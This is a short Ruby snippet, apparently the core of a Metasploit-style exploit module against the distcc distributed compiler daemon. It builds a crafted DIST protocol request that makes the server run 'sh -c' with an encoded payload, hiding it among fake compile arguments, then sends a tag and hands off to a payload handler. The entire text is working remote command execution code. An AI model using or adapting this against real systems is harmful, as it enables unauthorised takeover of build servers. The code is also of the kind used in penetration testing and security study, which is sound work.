def exploit
  connect

  distcmd = dist_cmd("sh", "-c", payload.encoded);
  sock.put(distcmd)

  dtag = rand_text_alphanumeric(10)
  sock.put("DOTI0000000A#{dtag}\n")

  handler
  disconnect
end

def dist_cmd(*args)
  args.concat(%w{# -c main.c -o main.o})
  res = "DIST00000001" + sprintf("ARGC%.8x", args.length)
  
  args.each do |arg|
    res << sprintf("ARGV%.8x%s", arg.length, arg)
  end

  return res
end 